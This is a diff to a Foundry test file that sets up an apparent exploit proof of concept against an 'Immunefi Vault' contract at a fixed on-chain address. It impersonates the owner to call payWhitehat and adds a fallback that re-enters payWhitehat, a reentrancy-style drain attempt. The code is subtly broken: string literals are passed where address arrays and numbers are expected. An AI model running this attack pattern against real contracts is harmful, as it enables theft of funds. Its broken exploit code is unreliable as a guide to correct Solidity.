@@ -7,30 +7,36 @@ import "lib/Vault/contracts/vault/Vault.sol";
 contract VaultTest is Test {
 
     Vault vault;
-    address deployer;
     address attacker;
 
     function setUp() public {
-        deployer = address(13);
-        vm.label(deployer, "Deploying Account (OnlyOwner)");
 
-        attacker = address(60);
+        attacker = address(15);
         vm.label(attacker, "Attacking Account");
 
-        vm.startPrank(deployer);
         vault = Vault(payable(0xB2429895f04CA8566BC992496d66116641bFF8b1));
         vm.deal(address(vault), 10 ether);
         vm.label(address(vault), "Immunefi Vault Contract");
-        vm.stopPrank();
     }
 
     function testExploit () public {
+        vm.startPrank(vault.owner());
+        vault.payWhitehat
+        (bytes32(0), payable(address(this)), [[
+            "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+            "1e18"
+        ]], 1 ether, 100000);
+        vm.stopPrank();
 
+        assertEq(vault.isPausedOnImmunefi(), true);
     }
 
     fallback () external payable {
         bytes memory payload = 
-        abi.encodeWithSignature("setIsPausedOnImmunefi(bool)", !vault.isPausedOnImmunefi());
+        abi.encodeWithSignature("payWhitehat(bytes32,address,address[],uint256,uint256)", bytes32(0), address(this), [[
+            "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+            "1e18"
+        ]], 1 ether, 100000);
 
         address _target = address(vault);
 
